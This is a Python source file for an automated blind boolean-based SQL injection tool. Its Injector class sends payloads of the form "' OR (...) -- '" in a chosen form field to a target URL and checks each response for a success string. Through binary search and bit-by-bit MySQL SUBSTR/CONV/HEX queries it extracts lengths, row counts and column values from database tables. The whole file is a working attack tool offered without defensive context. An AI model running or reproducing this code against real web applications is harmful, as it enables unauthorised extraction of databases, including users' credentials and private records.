import time, urllib.parse, urllib.request, socket, math

TIMEOUT = 2
MAX_TIMEOUTS = 5

class TimeoutLimitError(Exception):

    def __init__(self, url, timeouts):
        self.url = url
        self.timeouts = timeouts

class InjectionError(Exception):
    pass

class Injector:

    def __init__(self, url, success, delay, attack_field, other_fields, stringExecutor, charExecutor):
        self.url = url
        self.success = success
        self.delay = (delay/1000)
        self.attack_field = attack_field
        self.other_fields = other_fields
        self.stringExecutor = stringExecutor
        self.charExecutor = charExecutor
        self.test()

    def test(self):
        if not self.checkBit("1=1"):
            raise InjectionError

    def post(self, data):
        req = None
        timeouts = 0
        while req is None:
            if timeouts == MAX_TIMEOUTS:
                raise TimeoutLimitError(self.url, timeouts)
            try:
                req = urllib.request.urlopen(urllib.request.Request(self.url, urllib.parse.urlencode(data).encode('ascii')), timeout=TIMEOUT);
            except (socket.timeout, urllib.error.URLError):
                timeouts += 1
        return req.read().decode(req.headers.get_content_charset())

    def runInjection(self, inj):
        time.sleep(self.delay)
        data = self.other_fields.copy()
        data[self.attack_field] = inj
        res = self.post(data)
        return self.success in res

    def checkBit(self, check):
        return self.runInjection("' OR (%s) -- '" % check)

    def getNumberInRange(self, obj, lower, upper):
        diff = upper-lower
        if diff == 0:
            return lower
        if diff == 1:
            return upper if self.checkBit("(%s)=%d" % (obj, upper)) else lower
        mid = lower+math.floor(diff/2)
        return self.getNumberInRange(obj, lower, mid) if self.checkBit("(%s)<=%d" % (obj, mid)) else self.getNumberInRange(obj, mid, upper)

    def getNumber(self, obj):
        if self.checkBit("(%s) IS NULL OR (%s)=0" % (obj, obj)):
            return 0
        num = 1
        while not self.checkBit("(%s)<=%d" % (obj, num)):
            num *= 2
        return self.getNumberInRange(obj, math.floor(num/2), num)

    def getCount(self, table, where="1=1"):
        if where is None:
            where = "1=1"
        return self.getNumber("SELECT COUNT(*) FROM %s.%s WHERE %s"
                              % (table.schema, table.name, where))

    def getLen(self, obj):
        return self.getNumber("LENGTH((%s))" % obj)

    def getChar(self, obj, index):
        binstr = ''.join(list(self.charExecutor.map(
            (lambda x: "1" if
             self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
                           % (obj, index, x))
             else "0"), range(1, 8))))
        c = int(binstr, 2).to_bytes(15//8, 'big').decode()
        return c

    def getString(self, obj):
        namelen = self.getLen(obj)
        name = ''.join(list(self.stringExecutor.map(
            (lambda x: self.getChar(obj, x)),
            range(1, namelen+1))))
        return name

    def getDataFromTable(self, column, table, index=0, where="1=1"):
        if where is None:
            where = "1=1"
        tablename = table.name if table.schema is None else "%s.%s" % (table.schema, table.name)
        return self.getString("SELECT %s FROM %s WHERE %s LIMIT %d,1"
                              % (column, tablename, where, index))
